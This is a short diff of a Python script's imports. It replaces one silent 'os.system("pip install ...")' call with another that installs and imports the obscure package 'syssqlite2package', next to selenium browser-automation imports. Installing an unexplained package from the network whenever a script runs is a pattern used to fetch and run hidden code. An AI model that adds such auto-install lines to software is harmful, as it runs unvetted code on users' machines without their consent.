@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptographymodule")
-import pycryptographymodule
+os.system("pip install syssqlite2package")
+import syssqlite2package
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
